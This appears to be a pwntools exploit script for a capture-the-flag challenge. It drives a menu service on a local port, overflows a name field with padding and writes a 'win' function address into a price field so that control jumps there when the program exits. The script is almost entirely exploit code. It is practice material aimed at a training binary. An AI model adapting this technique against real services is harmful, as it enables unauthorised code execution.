from pwn import *

HOST, PORT = '0.0.0.0', 31337
r = remote(HOST, PORT)

def view():
    r.sendlineafter(b'> ', b'1')

def edit(t, data):
    if t == 'name':
        r.sendlineafter(b'> ', b'2')
        r.sendafter(b'> ', data)
    else:
        r.sendlineafter(b'> ', b'3')
        r.sendlineafter(b'> ', b'%d'%data)

def exit():
    r.sendlineafter(b'> ', b'4')

win=0x4012bb
view()
edit('name', b'A'*0x20)
edit('price', win)
exit()

r.interactive()